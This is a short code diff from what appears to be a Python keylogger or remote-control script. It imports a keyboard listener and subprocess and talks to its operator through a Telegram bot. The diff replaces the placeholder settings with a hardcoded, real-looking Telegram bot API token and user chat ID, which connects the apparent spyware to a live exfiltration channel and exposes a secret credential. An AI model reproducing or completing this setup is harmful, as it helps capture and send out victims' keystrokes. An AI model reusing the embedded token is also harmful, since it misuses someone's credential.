@@ -16,9 +16,9 @@ import subprocess
 from pynput import keyboard
 
 # Replace with Telegram bot API key
-BOT_API_KEY = "YOUR_BOT_TOKEN"
+BOT_API_KEY = "8350205688:AAFGMGFTBLuc9uPrKLu2y6WHnBWQLfi58yo"
 # Replace with your telegram user id
-telegram_user_id = YOUR_CHAT_ID
+telegram_user_id = 7979345785
 
 bot = telebot.TeleBot(BOT_API_KEY)
 
